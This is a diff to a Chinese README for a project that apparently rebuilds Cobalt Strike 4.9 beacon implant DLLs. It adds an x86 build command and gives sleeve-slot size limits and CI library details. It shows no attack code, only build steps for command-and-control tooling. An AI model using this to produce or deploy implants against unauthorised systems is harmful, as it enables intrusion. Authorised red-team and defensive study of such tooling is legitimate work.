@@ -6,11 +6,14 @@
 .\build.ps1                 # 构建全部四个变体（beacon/dnsb/extc2/pivot）的 x64 Release
 .\build.ps1 -Project dnsb   # 单独构建某个变体
 .\build.ps1 -Project beacon -HttpLibrary winhttp  # CS 4.9 WinHTTP 套筒 winhttpb.x64.dll
+.\build.ps1 -Project beacon -Platform Win32       # x86 套筒 beacon.dll（需 lib/tomcrypt.x86.lib）
 .\tests\run_tests.ps1       # 编译并运行宿主机侧测试（需 MSVC 环境）
 ```
 
-产物：`x64\Release\<name>.x64.dll` + 同名 `.map`（供 .obj 级体积归因），
-同时拷贝到 `bin\`。`-HttpLibrary winhttp` 时 beacon 产物为 `winhttpb.x64.dll`（TS 槽明文上限 309248 B）。
+产物：`x64\Release\<name>.x64.dll` 或 `Win32\Release\<name>.dll` + 同名 `.map`。
+`-HttpLibrary winhttp` 时 x64 产物为 `winhttpb.x64.dll`（TS 槽明文上限 309248 B）；
+x86 wininet 槽 `sleeve/beacon.dll` 明文上限 **247808**（编码 247840-32）。
+x86 库：CI `dll-x86` 作业用 `thirdparty/build_trimmed.ps1 -Arch x86` 现编，不提交 `lib/*.x86.lib`。
 
 ## 工具链（CI 实证 2026-08-29 修订）
 
